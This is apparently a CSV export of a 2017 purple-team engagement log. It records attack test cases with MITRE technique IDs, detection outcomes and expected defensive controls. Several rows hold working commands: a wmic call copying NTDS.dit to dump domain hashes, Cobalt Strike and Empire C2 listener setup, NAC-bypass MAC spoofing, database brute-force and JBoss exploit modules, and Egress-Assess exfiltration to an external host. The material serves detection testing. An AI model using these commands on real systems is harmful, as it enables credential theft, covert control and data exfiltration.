Enterprise Purple – 2017 Q3,Domain Controller Assault,Lateral Movement,Extract password hashes from DC by copying NTDS.dit,T1003,,Compromise a DC,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect malicious use of Volume Shadow Copy and related system utilities/commands to extract the NTDS.dit,,,"SIEM,EDR,Endpoint Protection",,2017-08-18T10:33:08.460Z,1503052388460,2017-08-18T12:24:23.460Z,1503059063460,2017-08-18T13:50:32.460Z,1503064232460,Security Risk Advisors,,Dump domain hashes for all domain users on the domain controller.,"wmic /node:DC /user:DOMAIN\User /password:UserPassword process call create ""cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\NTDS\ ntds.dit C:\Temp\NTDS.dit 2>&1 > C:\Temp\output.txt""",,Medium,High,Internal,Medium,,,,SMBexec
Enterprise Purple – 2017 Q3,Domain Controller Assault,Command & Control,Beacon HTTP payload on a DC,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,1) C2 beacon from DC is detected and blocked by EDR or network behavioral analysis tool,,,"EDR,Behavior Analytics",,2017-08-18T17:33:11.460Z,1503077591460,2017-08-18T18:02:53.460Z,1503079373460,2017-08-18T18:24:01.460Z,1503080641460,Security Risk Advisors,,"Establish an command-and-control beacon from a compromised DC, to other staging hosts on the internal network and potentially direct outbound connection to an external system.",Start http listener and generate a payload from Attacks -> Packages,,Low,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,PC MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-16T10:21:50.460Z,1502878910460,2017-08-16T12:19:37.460Z,1502885977460,2017-08-16T12:24:51.460Z,1502886291460,Security Risk Advisors,,Change the MAC address to a PC manufacturer code.,,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,Raspberry Pi,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-15T22:25:07.460Z,1502835907460,2017-08-15T23:07:48.460Z,1502838468460,2017-08-16T00:55:50.460Z,1502844950460,Security Risk Advisors,,Connect an untrusted device to the network to exploit NAC controls.,Connect raspberry pi into a wall jack.,,Low,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,Printer MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-16T04:05:47.460Z,1502856347460,2017-08-16T05:48:49.460Z,1502862529460,2017-08-16T07:15:34.460Z,1502867734460,Security Risk Advisors,,Change the MAC address to a printer manufacturer code.,"#Linux
macchanger -m <MAC> <Interface>
#Windows
Device Manager -> Network Adapters -> Advanced
Look for Locally Administrative Address or Network Address and change the value for that (No : needed)",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,Static IP Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-16T16:59:47.460Z,1502902787460,2017-08-16T18:11:25.460Z,1502907085460,2017-08-16T18:29:09.460Z,1502908149460,Security Risk Advisors,,Set a static IP address on the attack host to bypass any network restrictions.,Change ip address of network adapter to a static address,,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,Apple MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-16T13:23:51.460Z,1502889831460,2017-08-16T14:55:24.460Z,1502895324460,2017-08-16T16:06:37.460Z,1502899597460,Security Risk Advisors,,Change the MAC address to a Apple manufacturer code.,"Disable wifi and run the following:
sudo ifconfig en0 ether <New_Mac_Address>",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,Unusual MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-16T07:28:47.460Z,1502868527460,2017-08-16T07:59:16.460Z,1502870356460,2017-08-16T08:36:38.460Z,1502872598460,Security Risk Advisors,,Change the MAC address to an unusual manufacturer code.,"In device manager, change the network adapter's mac address value",,High,High,Internal,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q3,NAC Bypass,Exploitation,Network Device MAC Address,,,NAC bypass,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,Network Isolation,,2017-08-16T02:06:09.460Z,1502849169460,2017-08-16T02:24:28.460Z,1502850268460,2017-08-16T02:33:42.460Z,1502850822460,Security Risk Advisors,,Change the MAC address to a network device manufacturer code.,Use device manager and change the mac address value for network adapter,,High,High,Internal,Medium,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2017 Q3,NAC Bypass,Discovery,Passive Network Recon,T1049,,Passive network recon,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert when unknown device connects to LAN.,,,"Network Isolation,Behavior Analytics",,2017-08-15T18:36:54.460Z,1502822214460,2017-08-15T20:13:33.460Z,1502828013460,2017-08-15T21:20:42.460Z,1502832042460,Security Risk Advisors,,"Obtain information from the network including MAC addresses, valid IP addresses, and hostnames.",,,High,High,Internal,High,,,,"Manual Techniques,Native Windows Commands"
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,EDR,Behavior Analytics",Gunhed,2017-08-12T17:35:01.460Z,1502559301460,2017-08-12T18:17:17.460Z,1502561837460,2017-08-12T18:34:24.460Z,1502562864460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",,2017-08-12T06:50:46.460Z,1502520646460,2017-08-12T08:47:22.460Z,1502527642460,2017-08-12T09:14:14.460Z,1502529254460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",,2017-08-12T12:39:56.460Z,1502541596460,2017-08-12T13:34:17.460Z,1502544857460,2017-08-12T14:17:00.460Z,1502547420460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,EDR,Behavior Analytics",,2017-08-12T14:57:32.460Z,1502549852460,2017-08-12T15:39:24.460Z,1502552364460,2017-08-12T16:20:11.460Z,1502554811460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",,2017-08-12T03:39:40.460Z,1502509180460,2017-08-12T05:24:26.460Z,1502515466460,2017-08-12T06:17:56.460Z,1502518676460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",,2017-08-12T00:44:13.460Z,1502498653460,2017-08-12T02:31:37.460Z,1502505097460,2017-08-12T03:16:32.460Z,1502507792460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",,2017-08-12T09:35:06.460Z,1502530506460,2017-08-12T10:15:44.460Z,1502532944460,2017-08-12T10:56:21.460Z,1502535381460,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,NotDetected,TBD,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall",,2017-08-12T19:05:33.460Z,1502564733460,2017-08-12T19:17:49.460Z,1502565469460,2017-08-12T20:53:11.460Z,1502571191460,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2017 Q3,External Automated Scans,Reconnaissance,Network Vulnerability Scan - External IP Ranges,T1046,,Vulnerability scanning,Completed,Detected,Med,TBD,TBD,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",Gunhed,2017-08-04T18:29:24.460Z,1501871364460,2017-08-04T20:14:58.460Z,1501877698460,2017-08-04T20:35:18.460Z,1501878918460,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",,,High,Medium,Both,Low,,,,Nessus
Enterprise Purple – 2017 Q3,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 2,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2017-08-04T15:13:01.460Z,1501859581460,2017-08-04T17:09:01.460Z,1501866541460,2017-08-04T17:56:46.460Z,1501869406460,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Automated Scans,Reconnaissance,Application Vulnerability Scan - TARGET 1,T1046,,Vulnerability scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) An alert is configured on the external WAF, IDS/IPS, or firewall to alert on high volume scan activity.",,,"Firewall,WAF",,2017-08-04T12:31:29.460Z,1501849889460,2017-08-04T12:40:20.460Z,1501850420460,2017-08-04T14:01:01.460Z,1501855261460,Security Risk Advisors,,"Launch a application vulnerability scan against targeted application, creating an excessive amount of traffic originating from a single source.",Run active scans using Burp or other web application scanning tools,,High,Medium,Both,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2017-08-19T03:28:59.460Z,1503113339460,2017-08-19T04:32:39.460Z,1503117159460,2017-08-19T04:39:29.460Z,1503117569460,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2017 Q3,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2017-08-19T15:59:14.460Z,1503158354460,2017-08-19T17:03:28.460Z,1503162208460,2017-08-19T17:16:11.460Z,1503162971460,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2017 Q3,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2017-08-19T06:21:22.460Z,1503123682460,2017-08-19T06:36:23.460Z,1503124583460,2017-08-19T08:12:18.460Z,1503130338460,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2017 Q3,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,DLP,,2017-08-19T19:05:03.460Z,1503169503460,2017-08-19T19:21:35.460Z,1503170495460,2017-08-19T20:39:47.460Z,1503175187460,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
Enterprise Purple – 2017 Q3,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2017-08-19T12:59:26.460Z,1503147566460,2017-08-19T13:51:54.460Z,1503150714460,2017-08-19T14:28:07.460Z,1503152887460,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2017 Q3,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2017-08-19T08:42:42.460Z,1503132162460,2017-08-19T09:32:27.460Z,1503135147460,2017-08-19T11:20:59.460Z,1503141659460,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2017 Q3,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2017-08-17T21:46:37.460Z,1503006397460,2017-08-17T22:15:21.460Z,1503008121460,2017-08-17T22:15:31.460Z,1503008131460,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
Enterprise Purple – 2017 Q3,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,,,2017-08-18T02:55:19.460Z,1503024919460,2017-08-18T02:55:37.460Z,1503024937460,2017-08-18T03:27:34.460Z,1503026854460,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q3,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,,,,,,2017-08-18T04:29:55.460Z,1503030595460,2017-08-18T05:11:41.460Z,1503033101460,2017-08-18T05:35:04.460Z,1503034504460,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q3,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,SIEM,,2017-08-17T23:41:54.460Z,1503013314460,2017-08-17T23:55:38.460Z,1503014138460,2017-08-18T00:34:53.460Z,1503016493460,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q3,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,,,2017-08-18T01:07:46.460Z,1503018466460,2017-08-18T01:58:44.460Z,1503021524460,2017-08-18T02:52:22.460Z,1503024742460,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q3,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2017-08-04T06:10:31.460Z,1501827031460,2017-08-04T06:52:48.460Z,1501829568460,2017-08-04T08:38:33.460Z,1501835913460,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,NotDetected,TBD,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",,2017-08-04T08:54:56.460Z,1501836896460,2017-08-04T10:09:29.460Z,1501841369460,2017-08-04T11:02:20.460Z,1501844540460,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q3,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2017-08-03T22:16:32.460Z,1501798592460,2017-08-03T23:49:35.460Z,1501804175460,2019-01-28T16:32:19.302Z,1548693139302,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2017-08-04T01:25:39.460Z,1501809939460,2017-08-04T03:22:18.460Z,1501816938460,2019-01-28T16:24:36.698Z,1548692676698,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2017 Q3,External Port Scans,Reconnaissance,"External - Stealthy Port Scan with 3 ports, service enumeration, limited NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-08-03T07:59:48.460Z,1501747188460,2017-08-03T09:32:08.460Z,1501752728460,2017-08-03T11:15:02.460Z,1501758902460,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 80,443,8080 --data-length 471 --randomize-hosts --script=http-title.nse --script-args=http.useragent=""Mozilla/5.0;Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_stealthy -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q3,External Port Scans,Reconnaissance,"External - Moderate Port Scan with 10 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-08-03T05:03:43.460Z,1501736623460,2017-08-03T06:20:22.460Z,1501741222460,2017-08-03T07:08:56.460Z,1501744136460,Security Risk Advisors,,Identify open ports and services,"nmap --open -v 2 -sS -Pn -p 21,80,443,8080,8443 --script=ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-admin-check.nse,http-title.nse --script-args=http.useragent=""Mozilla/5.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; like Gecko"" -oA scans/nmap_moderate -iL targets.txt",,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q3,External Port Scans,Reconnaissance,"External - Noisy Port Scan with 1000 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,TBD,,"1) Port scanning is detected by external IDS/IPS or firewall, with alert triggered in SIEM or other alerting mechanism",,,Firewall,,2017-08-03T12:50:20.460Z,1501764620460,2017-08-03T13:32:14.460Z,1501767134460,2017-08-03T14:24:21.460Z,1501770261460,Security Risk Advisors,,Identify open ports and services,nmap --open -v2 -sS -Pn -oA nmap_noisy -iL ranges.txt,,High,Low,External,Low,,,,Nmap
Enterprise Purple – 2017 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - NET,T1087,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) EDR and/or SIEM rules are configured to detect use of native commands such as 'net' and modern PowerShell equivalents",,,"SIEM,EDR,Behavior Analytics",,2017-08-17T08:08:29.460Z,1502957309460,2017-08-17T09:22:57.460Z,1502961777460,2017-08-17T10:26:31.460Z,1502965591460,Security Risk Advisors,,"Leverage the builtin ""net"" command to perform queries against the Windows domain for common groups.","Domain Controllers:
net group ""Domain Controllers"" /domain

Domain Admins:
net group ""Domain Admins"" /domain

Administrators of the Domain:
net localgroup ""Administrators"" /domain",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - NSlookup,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Large number of scripted nslookup commands potentially detected by EDR and/or SIEM solution, or behavioral monitoring tool",,,"SIEM,EDR,Behavior Analytics",,2017-08-17T17:51:14.460Z,1502992274460,2017-08-17T19:34:30.460Z,1502998470460,2017-08-17T21:03:48.460Z,1503003828460,Security Risk Advisors,,"Leverage the builtin ""nslookup"" command to perform queries against the local DNS servers for specific server information.","DNS Servers: nslookup -type=NS [FQDN]
Domain Controllers: nslookup -type=SRV _ldap._tcp.[FQDN]",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - BloodHound,T1018,,Domain Enumeration,Completed,Detected,High,TBD,Yes,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Windows utilities used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics",Progear,2017-08-17T15:17:18.460Z,1502983038460,2017-08-17T16:02:49.460Z,1502985769460,2019-01-28T16:31:04.748Z,1548693064748,Security Risk Advisors,,"Use Bloodhound/Sharphound to preform queries across the local domain.

- Domain Group Memberships
- Domain Trusts
- Local Admins
- Sessions","Using SharpHound.ps1:
Invoke-BloodHound

Using SharpHound.exe:
SharpHound.exe",,High,Low,Internal,High,,,,
Enterprise Purple – 2017 Q3,Windows Domain Enumeration,Discovery,Domain Enumeration - LDAP using PowerShell,T1059.001,,Domain Enumeration,Completed,Detected,Info,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Legacy Windows and native PowerShell commands used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics",Progear,2017-08-17T11:50:32.460Z,1502970632460,2017-08-17T12:29:07.460Z,1502972947460,2019-01-28T16:30:33.824Z,1548693033824,Security Risk Advisors,,Use PowerView v3 to perform queries against the Windows domain for common groups.,"List All Admins:
Get-DomainGroupMember -Identity ""Administrators"" -Domain [FQDN] -Recurse | select MemberName | fl",,High,Low,Internal,High,,,,PowerView
Enterprise Purple – 2017 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTP C2,T1041,,Exfil data using common network protocols,Completed,Detected,High,TBD,TBD,,,,,"Web Gateway,DLP,Firewall",Microcosm,2017-08-21T07:11:50.460Z,1503299510460,2017-08-21T08:34:32.460Z,1503304472460,2017-08-21T10:11:33.460Z,1503310293460,Security Risk Advisors,,Extract data from the network over HTTP tcp/80 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q3,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTPS C2,T1041,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,No,,1) HTTPS / SSL/TLS decryption is enabled in proxy or firewall appliances,,,"Web Gateway,Firewall",,2017-08-21T11:44:42.460Z,1503315882460,2017-08-21T13:42:27.460Z,1503322947460,2017-08-21T13:42:44.460Z,1503322964460,Security Risk Advisors,,Extract data from the network over HTTP tcp/443 to external host or IP.,"# HTTPS Server
./Egress-Assess.py --server https

# HTTPS Client
Invoke-EgressAssess -Client HTTPS -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing",,High,High,Both,Low,,,,Egress-Assess
